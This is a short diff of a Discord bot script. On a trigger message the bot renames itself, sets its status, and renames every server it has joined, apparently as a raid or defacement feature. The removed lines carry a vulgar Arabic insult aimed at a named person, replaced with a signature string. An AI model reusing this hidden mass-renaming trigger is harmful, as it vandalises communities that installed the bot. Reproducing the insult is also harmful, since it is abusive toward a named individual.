@@ -20,13 +20,13 @@ client.on('message', message => {
 });
 client.on('message', message => {
  if (message.content === x_x) {
-  client.user.setUsername("كس امك كيان")
+  client.user.setUsername("يلا !")
 
  }
 });
 client.on('message', message => {
  if (message.content === x_x) {
-  client.user.setGame(`كس امك كيان`, 'https://www.twitch.tv/hix')
+  client.user.setGame(`by m39ob`, 'https://www.twitch.tv/hix')
 
  }
 });
@@ -41,7 +41,7 @@ client.on('message', message => {
 client.on('message', message => {
  if (message.content === x_x) {
   client.guilds.forEach(m => {
-   m.setName(`كس امك كيان`)
+   m.setName(`by m39ob`)
   })
  }
 });
